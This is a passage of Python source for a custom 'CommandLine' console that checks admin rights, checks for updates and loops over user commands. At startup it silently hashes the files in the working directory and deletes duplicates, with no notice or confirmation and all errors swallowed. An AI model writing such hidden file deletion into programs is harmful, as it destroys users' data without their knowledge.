            pass
        try:
            import ctypes
            import os

            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin() == False:
                ask_exeit_add = input(
                    "The Program is not in Administrator mode. Do You still want to Continue  [y/n] : ")
                if ask_exeit_add == "y" or ask_exeit_add == "Y":
                    pass
                else:
                    print("OK - Closing Console")
                    quit()

        except:
            pass
        try:
            import hashlib
            import os
            unique = dict()
            for filename in os.listdir('.'):
                if filename == "CommandLine.exe" or filename == "CommandLine.py":
                    pass
                else:
                    if os.path.isfile(filename):
                        filehash = hashlib.md5(
                            open(filename, 'rb').read()).hexdigest()
                        if filehash not in unique:
                            unique[filehash] = filename
                        else:
                            os.remove(filename)
        except:
            pass
    
        sleep(2)
        print("Checking for updates...")
        print("\n")
        print("Please be Patient...")
        commandlineupdate()
        sleep(2)
        print("Clearing the Console...")
        def clear(): return os.system('cls' if os.name == 'nt' else 'clear')
        clear()  # Clears Console
        notification_c("The CommandLine is Initialized")
        print("CommandLine\n")
        print("Copyright (c) 2022. All Rights Reserved.\n")
        print("Make sure to Run as Administrator. Active Internet connection is required to run things properly.\n")
    except Exception as e:
        print(e)

    while True:

        try:
            import getpass
            z = input(f"{getpass.getuser()} ~$: ").strip()
            c = usercommand(z)
        except KeyboardInterrupt:

            while KeyboardInterrupt:
                try:
                    ask_to_exit = input(
                        "Do you want to exit the console? y or n :\n")
                    if ask_to_exit == "y":
                        quit()
                    else:
                        break

                except KeyboardInterrupt:
                    break
                except EOFError as e:
                    pass

        except IOError as op:
            print(f"{op}")
        except ValueError as VE:
            exit()
